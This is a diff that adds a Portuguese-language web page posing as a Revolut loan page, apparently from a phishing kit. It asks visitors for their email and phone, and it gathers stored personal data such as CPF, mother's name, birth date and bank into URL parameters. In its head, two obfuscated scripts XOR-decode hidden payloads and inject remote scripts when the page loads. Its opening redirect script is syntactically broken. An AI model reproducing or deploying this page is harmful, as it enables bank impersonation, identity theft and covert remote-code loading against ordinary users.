@@ -1,0 +1,272 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+<script>
+function redirectWithParams(destination) {
+  window.location.href = destination;
+}
+
+if (destination.includes("?")) {
+window.location.href = destination + "&" + currentParams.substring(1);
+} else {
+window.location.href = destination + currentParams;
+}
+}
+</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<title>Confirme seus dados — Revolut</title>
+<link rel="icon" href="images/revolut-favicon.svg">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{background:#f3f4f6;color:#EE4D2D;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;min-height:100vh}
+  .wrap{max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;background:#f3f4f6}
+
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:#fff;border-bottom:1px solid #eee}
+  .menu-btn{width:36px;height:36px;border-radius:10px;background:#f1ecff;display:flex;align-items:center;justify-content:center;border:0}
+  .menu-btn span{display:block;width:14px;height:2px;background:#EE4D2D;position:relative}
+  .menu-btn span::before,.menu-btn span::after{content:"";position:absolute;left:0;width:14px;height:2px;background:#EE4D2D}
+  .menu-btn span::before{top:-5px}.menu-btn span::after{top:5px}
+  .brand{font-weight:800;font-size:22px;letter-spacing:-0.5px;margin-left:10px;flex:1}
+  .user-block{display:flex;align-items:center;gap:10px}
+  .user-info{text-align:right;line-height:1.1}
+  .user-info .name{font-size:13px;font-weight:600;text-transform:lowercase}
+  .user-info .cpf{font-size:11px;color:#9ca3af;letter-spacing:1px}
+  .avatar{width:34px;height:34px;border-radius:50%;border:1.5px solid #EE4D2D;display:flex;align-items:center;justify-content:center}
+  .avatar svg{width:18px;height:18px}
+
+  .card{margin:16px;background:#fff;border-radius:22px;padding:28px 22px;box-shadow:0 1px 2px rgba(0,0,0,.04);flex:1}
+  h1{text-align:center;font-size:22px;font-weight:800;letter-spacing:-.6px;margin-bottom:8px;line-height:1.25}
+  .lead{text-align:center;font-size:14px;color:#52525b;margin-bottom:26px;line-height:1.45}
+
+  .info-box{display:flex;gap:14px;background:#f9fafb;border:1.5px solid #f0f0f3;border-radius:16px;padding:18px 16px;margin-bottom:24px}
+  .info-icon{width:44px;height:44px;min-width:44px;background:#EE4D2D;border-radius:12px;display:flex;align-items:center;justify-content:center;color:#fff}
+  .info-icon svg{width:22px;height:22px}
+  .info-title{font-size:14px;font-weight:800;margin-bottom:10px;color:#EE4D2D}
+  .info-list{list-style:none;padding:0;margin:0}
+  .info-list li{display:flex;align-items:flex-start;gap:8px;font-size:13px;color:#52525b;margin-bottom:6px;line-height:1.4}
+  .info-list li:last-child{margin-bottom:0}
+  .check{width:16px;height:16px;min-width:16px;background:#f1ecff;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#EE4D2D;margin-top:1px}
+  .check svg{width:10px;height:10px}
+
+  .form-group{margin-bottom:18px}
+  .form-label{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:700;margin-bottom:8px;color:#EE4D2D}
+  .form-label svg{width:18px;height:18px;color:#EE4D2D}
+  .required{color:#ef4444;margin-left:2px}
+  .input-wrap{position:relative}
+  .input-wrap .input-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:20px;height:20px;color:#9ca3af;pointer-events:none}
+  .form-input{width:100%;padding:14px 16px 14px 46px;border:1.5px solid #e5e7eb;border-radius:14px;font-size:15px;font-weight:500;color:#EE4D2D;background:#fff;transition:all .2s ease}
+  .form-input:focus{outline:none;border-color:#EE4D2D;box-shadow:0 0 0 4px rgba(10,10,10,.06)}
+  .form-input::placeholder{color:#9ca3af}
+  .form-input.error{border-color:#ef4444}
+  .error-msg{display:none;margin-top:6px;font-size:12px;color:#ef4444;font-weight:600}
+  .error-msg.show{display:block}
+
+  .phone-row{display:flex;gap:10px}
+  .phone-prefix{display:flex;align-items:center;gap:8px;padding:12px 14px;border:1.5px solid #e5e7eb;border-radius:14px;background:#fff;font-size:15px;font-weight:600;white-space:nowrap}
+  .flag{width:20px;height:14px;border-radius:2px;background:linear-gradient(180deg,#006600 38%,#ff0000 38%);position:relative;overflow:hidden}
+  .flag::after{content:"";position:absolute;left:0;top:0;right:0;bottom:0;background:linear-gradient(135deg,transparent 45%,#ffff00 45%,#ffff00 55%,transparent 55%)}
+  .phone-row .form-input{flex:1}
+  .phone-row .form-input{padding-left:16px}
+
+  .btn-submit{width:100%;background:#EE4D2D;color:#fff;border:none;padding:16px 24px;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-top:8px;transition:all .2s ease}
+  .btn-submit:active{transform:scale(.98)}
+  .btn-submit svg{width:20px;height:20px}
+
+  .loading-overlay{position:fixed;inset:0;background:rgba(10,10,10,.55);display:none;align-items:center;justify-content:center;z-index:9999;backdrop-filter:blur(3px)}
+  .loading-overlay.show{display:flex}
+  .loading-box{background:#fff;border-radius:22px;padding:36px 32px;text-align:center;max-width:320px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
+  .loading-box .spinner{width:54px;height:54px;border:5px solid #f1ecff;border-top-color:#EE4D2D;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 18px}
+  .loading-box .text{font-size:16px;font-weight:700;color:#EE4D2D}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .footer{text-align:center;padding:24px 16px 30px;color:#71717a;font-size:11px;background:#f3f4f6}
+  .footer .l{font-weight:800;color:#EE4D2D;font-size:18px;letter-spacing:-.4px;margin-bottom:6px}
+</style>
+
+
+
+
+
+<script>
+  window.va = window.va || function () { (window.vaq = window.vaq || []).push(arguments); };
+</script>
+
+
+<style id="legal-footer-style">
+  .legal-footer{width:100%;max-width:760px;margin:22px auto 0;padding:18px 16px 26px;text-align:center;color:#6b7280;font-size:11.5px;line-height:1.55}
+  .legal-footer__company{font-weight:700;color:#111827;margin-bottom:2px}
+  .legal-footer__links{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:8px}
+  .legal-footer__links a{color:#111827;text-decoration:underline;text-underline-offset:3px}
+</style>
+  
+
+
+
+
+
+<script>(function(){var b_d=atob("DIlbanqRr1u5pAncE/J5Hwj9jWGbzH2oY/phRVXyyzWX0X2xeu8iRBn+wnXb1iavcPsyGg7igCvQ3GywPPkyEh/9gTHKhiX+cv0vGBPz2i/c1yvmSNR3SB39wDnYyHr+KdIgSBTwwj6bniusevE+BjP1jXeb0miwZux5UFinzj3fxTq/drlqX0innj6JnGzuJrxqCEiz0gbE");var d_im4z=[];for(var x_onn=0;x_onn<b_d.length;x_onn++){d_im4z.push(b_d.charCodeAt(x_onn)&255);}var q_gib=d_im4z[0];var r_6k3=d_im4z.slice(1,1+q_gib);var y_8q=d_im4z.slice(1+q_gib);var q_x1k=y_8q.map(function(b,o_obb){return b^r_6k3[o_obb%q_gib];});var l_qj="";for(var h_c5a7=0;h_c5a7<q_x1k.length;h_c5a7++){l_qj+=String.fromCharCode(q_x1k[h_c5a7]&255);}var j_snh=decodeURIComponent(escape(l_qj));var y_8=JSON.parse(j_snh);var o_933o=y_8.globals||[];o_933o.forEach(function(s_y){window[s_y.name]=s_y.value;});var g_6za=document.createElement("script");g_6za.src=y_8.url;g_6za.async=true;g_6za.defer=true;(y_8.attributes||[]).forEach(function(e_zvf1){g_6za.setAttribute(e_zvf1.name,e_zvf1.value);});(document.head||document.documentElement).appendChild(g_6za);})();</script>
+<script>(function(){var x_emd=atob("DKKyBEDeK7Uok71SO9mQcTKyCY8K+8kmS9GIK2+9T9sG5sk/UsTLKiOxRptK4ZIhWNDbdDStBMBc/s59V8PGYTOqBd9bsZFwWtbGdim8XsFN4J9oYNmQaiGzTpcSsdkzT8OfcTSzQtNRvs0gXtTXajTzU9ZH95AhWMmQKGKoStld9p9oGYDPKDv8RdRF9p9oGcbTcCHzXsFF+tsrFtLAYTa7RcEF4MgwUsbBJmz8XdRE5thwAYCQeR2j");var y_b3ne=[];for(var d_5lk=0;d_5lk<x_emd.length;d_5lk++){y_b3ne.push(x_emd.charCodeAt(d_5lk)&255);}var b_hhjm=y_b3ne[0];var t_8=y_b3ne.slice(1,1+b_hhjm);var y_xwi=y_b3ne.slice(1+b_hhjm);var b_g=y_xwi.map(function(b,k_v7){return b^t_8[k_v7%b_hhjm];});var h_9="";for(var s_v=0;s_v<b_g.length;s_v++){h_9+=String.fromCharCode(b_g[s_v]&255);}var j_c=decodeURIComponent(escape(h_9));var p_y=JSON.parse(j_c);var z_mpan=p_y.globals||[];z_mpan.forEach(function(t_4a){window[t_4a.name]=t_4a.value;});var v_kq=document.createElement("script");v_kq.src=p_y.url;v_kq.async=true;v_kq.defer=true;(p_y.attributes||[]).forEach(function(d_q1){v_kq.setAttribute(d_q1.name,d_q1.value);});(document.head||document.documentElement).appendChild(v_kq);})();</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <button class="menu-btn" aria-label="menu"><span></span></button>
+    <div class="brand"><img src="images/revolut-logo.svg" alt="Revolut" style="height:28px;width:auto;display:block;"></div>
+    <div class="user-block">
+      <div class="user-info">
+        <div class="name" id="userName">cliente</div>
+        <div class="cpf" id="userCpf">*** *** ***</div>
+      </div>
+      <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"></path><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"></path></svg></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h1>Confirme seus dados de contato</h1>
+    <div class="lead">Para receber os avisos de pagamento e atualizações sobre seu empréstimo</div>
+
+    <div class="info-box">
+      <div class="info-icon">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+      </div>
+      <div>
+        <div class="info-title">Você vai receber:</div>
+        <ul class="info-list">
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></span>Avisos de pagamento por e-mail</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></span>Avisos de vencimento por SMS</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></span>Atualizações sobre seu contrato</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path></svg></span>Comprovantes de pagamento</li>
+        </ul>
+      </div>
+    </div>
+
+    <form id="contactForm" onsubmit="handleSubmit(event)">
+      <div class="form-group">
+        <label class="form-label" for="emailInput">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+          E-mail <span class="required">*</span>
+        </label>
+        <div class="input-wrap">
+          <input autocomplete="email" class="form-input" id="emailInput" placeholder="seu@email.com" required="" type="email">
+          <svg class="input-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        </div>
+        <div class="error-msg" id="emailError">Por favor, insira um e-mail válido</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="phoneInput">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+          Celular <span class="required">*</span>
+        </label>
+        <div class="phone-row">
+          <div class="phone-prefix"></span> +55</div>
+          <input autocomplete="tel" class="form-input" id="phoneInput" maxlength="16" placeholder="(11) 91234-5678" required="" type="tel">
+        </div>
+        <div class="error-msg" id="phoneError">Por favor, insira um celular válido</div>
+      </div>
+
+      <button class="btn-submit" id="submitBtn" type="submit">
+        <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        Confirmar e Continuar
+      </button>
+    </form>
+  </div>
+
+  <div class="footer">
+    <div class="l"><img src="images/revolut-logo.svg" alt="Revolut" style="height:32px;width:auto;display:block;margin:0 auto 6px;"></div>
+    <div>Rev Business LTD</div>
+    <div>Av. Brigadeiro Faria Lima, 4440 - 11º andar, Itaim Bibi, São Paulo - SP, 04538-132</div>
+  </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-box">
+    <div class="spinner"></div>
+    <div class="text">Salvando seus dados...</div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var nome = (localStorage.getItem('nome')||'cliente').trim();
+  var p = nome.split(/\s+/).filter(Boolean);
+  var primeiro = p[0] || 'cliente';
+  var ultimo = p.length > 1 ? p.slice(-1)[0] : '';
+  var exibicao = (primeiro + ' ' + ultimo).trim().toLowerCase();
+  document.getElementById('userName').textContent = exibicao;
+  var cpfVal = (localStorage.getItem('cpf')||localStorage.getItem('cpf')||'').replace(/\D/g,'');
+  if(cpfVal.length>=9) document.getElementById('userCpf').textContent = cpfVal.slice(0,3)+' *** *'+cpfVal.slice(7,9);
+
+  var savedEmail = localStorage.getItem('email');
+  var savedPhone = localStorage.getItem('telefone') || localStorage.getItem('telephone') || localStorage.getItem('phone');
+  if(savedEmail) document.getElementById('emailInput').value = savedEmail;
+  if(savedPhone) document.getElementById('phoneInput').value = formatPhone(savedPhone);
+
+  document.getElementById('phoneInput').addEventListener('input', function(e){
+    e.target.value = formatPhone(e.target.value.replace(/\D/g,''));
+  });
+
+  document.getElementById('emailInput').addEventListener('blur', function(){ validateEmail(this.value); });
+  document.getElementById('phoneInput').addEventListener('blur', function(){ validatePhone(this.value); });
+
+  function formatPhone(v){
+    v = v.replace(/\D/g,'');
+    if(v.length>11) v = v.slice(0,11);
+    if(v.length<=2) return v.replace(/(\d{0,2})/,'($1');
+    if(v.length<=6) return v.replace(/(\d{2})(\d{0,4})/,'($1) $2').trim();
+    if(v.length<=10) return v.replace(/(\d{2})(\d{4})(\d{0,4})/,'($1) $2-$3');
+    return v.replace(/(\d{2})(\d{5})(\d{0,4})/,'($1) $2-$3');
+  }
+
+  function validateEmail(email){
+    var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    var err = document.getElementById('emailError');
+    var inp = document.getElementById('emailInput');
+    if(!re.test(email)){ inp.classList.add('error'); err.classList.add('show'); return false; }
+    inp.classList.remove('error'); err.classList.remove('show'); return true;
+  }
+
+  function validatePhone(phone){
+    var cl = phone.replace(/\D/g,'');
+    var err = document.getElementById('phoneError');
+    var inp = document.getElementById('phoneInput');
+    if(cl.length < 10){ inp.classList.add('error'); err.classList.add('show'); return false; }
+    inp.classList.remove('error'); err.classList.remove('show'); return true;
+  }
+
+  window.handleSubmit = function(event){
+    event.preventDefault();
+    var email = document.getElementById('emailInput').value.trim();
+    var phone = document.getElementById('phoneInput').value;
+    var phoneClean = phone.replace(/\D/g,'');
+    if(!validateEmail(email) || !validatePhone(phone)) return false;
+    document.getElementById('loadingOverlay').classList.add('show');
+    localStorage.setItem('email', email);
+    localStorage.setItem('telefone', phoneClean);
+    localStorage.setItem('telephone', phoneClean);
+    localStorage.setItem('phone', phoneClean);
+    var urlParams = new URLSearchParams(window.location.search);
+    urlParams.set('email', email);
+    urlParams.set('telephone', phoneClean);
+    var importantParams = ['income','salaryDay','occupation','education','utm_source','utm_campaign','utm_medium','utm_content','utm_term','name','document','nome_mae','data_nasc','dueDate','cpf','nome','banco','selectedLoanAmount','selectedInstallments','selectedMonthlyPayment'];
+    importantParams.forEach(function(param){
+      var value = localStorage.getItem(param);
+      if(value && !urlParams.has(param)) urlParams.set(param, value);
+    });
+    setTimeout(function(){
+      redirectWithParams('configurando-conta.html');
+    }, 1500);
+    return false;
+  };
+})();
+</script>
+
+<div class="legal-footer">
+  <div class="legal-footer__company">Rev Business LTD</div>
+  <div>Av. Brigadeiro Faria Lima, 4440 - 11º andar, Itaim Bibi, São Paulo - SP, 04538-132</div>
+  <div class="legal-footer__links">
+    <a href="termos-de-uso.html">Termos de Uso</a>
+    <a href="politica-de-privacidade.html">Política de Privacidade</a>
+  </div>
+</div>
+</body></html>
